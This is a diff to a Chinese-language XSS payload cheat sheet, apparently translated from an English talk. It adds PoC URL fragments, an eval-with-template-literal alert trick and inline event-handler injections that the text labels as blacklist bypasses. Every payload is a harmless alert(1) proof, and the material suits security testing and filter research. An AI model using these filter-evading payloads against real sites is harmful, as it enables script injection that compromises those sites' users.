@@ -293,6 +293,21 @@ top.open`javas\cript:al\ert\x281\x29${0}0`
 <svg onload=eval(" ' "+URL)>
 <svg id=eval onload=top[id](" ' "+URL)>
 ```
+PoC URL必须包含以下之一： <br>
+```
+=> FILE.php/'/alert(1)//?...
+=> #'/alert(1)
+```
+**47.Alert Alternative - Eval + URL with Template Literal (弹窗代替方案-带有模板文字的Eval + URL)** <br>
+```
+${alert(1)}<svg onload=eval('`//'+URL)>
+```
+**48.HTML Injection - Inline Alternative (HTML注入-内联替代)**
+用于绕过黑名单。<br>
+```
+"onpointerover=alert(1) //
+"autofocus onfocusin=alert(1) //
+```
 
 ## 致谢
 **英文议题作者：** <br>
